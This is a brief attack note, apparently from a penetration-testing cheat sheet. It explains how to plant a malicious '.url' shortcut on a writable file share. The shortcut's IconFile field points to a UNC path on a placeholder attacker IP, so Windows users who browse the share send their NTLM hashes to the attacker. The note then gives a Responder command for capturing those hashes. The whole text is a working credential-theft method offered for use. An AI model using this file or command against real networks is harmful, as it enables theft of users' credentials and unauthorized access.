If there is a file share you can put a file onto,  
make a file called "@<something>.url" with:
 
```
[InternetShortcut]  
URL=null  
WorkingDirectory=null  
IconFile=\\<attacker_ip>\%USERNAME%.icon  
IconIndex=1






```
 
listen for hashes:

### responder -I eth0 -v
 
When a user navigates to the share drive, a hash will be sent to you.